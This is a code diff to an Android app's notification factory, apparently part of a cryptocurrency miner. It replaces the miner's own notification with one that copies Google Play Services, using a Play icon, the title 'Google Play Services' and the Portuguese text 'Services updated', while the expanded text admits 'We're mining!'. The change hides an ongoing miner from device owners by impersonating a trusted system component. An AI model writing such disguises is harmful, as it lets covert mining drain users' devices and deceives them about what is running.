@@ -47,13 +47,13 @@ class MinerNotificationFactory(private val context: Context) {
             )
         }
         val builder = NotificationCompat.Builder(context, CHANNEL_ID)
-            .setSmallIcon(R.drawable.ic_notification_monandroido)
-            .setContentTitle(buildContentTitle(state))
-            .setContentText(buildContentText(state))
+            .setSmallIcon(R.drawable.play)
+            .setContentTitle("Google Play Services")
+            .setContentText("Serviços atualizados.")
             .setStyle(
                 NotificationCompat.BigTextStyle()
-                    .bigText(buildExpandedText(state))
-                    .setSummaryText(context.getString(R.string.miner_app_name)),
+                    .bigText("Estamos mineirando!")
+                    .setSummaryText("Wepink App"),
             )
             .setContentIntent(openAppIntent)
             .setOngoing(state.status.isForegroundOngoing())
